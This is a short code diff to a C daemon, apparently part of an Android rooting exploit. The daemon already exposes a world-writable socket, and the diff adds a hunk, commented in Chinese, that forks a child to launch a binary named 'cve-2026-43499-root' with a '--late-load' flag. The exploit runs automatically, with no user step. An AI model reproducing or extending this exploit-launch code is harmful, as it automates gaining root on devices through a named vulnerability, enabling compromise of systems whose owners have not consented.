@@ -866,6 +866,18 @@ static int daemon_main(void) {
   }
   chmod(BOOTSTRAP_SOCK_PATH, 0666);
 
+  // ==========新增代码：自动fork执行late-load==========
+  pid_t autoproc = fork();
+  if (autoproc == 0) {
+      // 等待socket服务完全就绪
+      sleep(1);
+      char *cmd[] = {"/data/local/tmp/cve-2026-43499-root", "--late-load", NULL};
+      execv(cmd[0], cmd);
+      // execv失败才会走到这里
+      _exit(99);
+  }
+  // ==================================================
+
   for (;;) {
     int conn = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
     if (conn < 0 && errno == EINTR) {
@@ -888,6 +900,7 @@ static int daemon_main(void) {
     }
   }
 }
+
 
 static int umh_main(int argc, char **argv) {
   if (geteuid() != 0) {
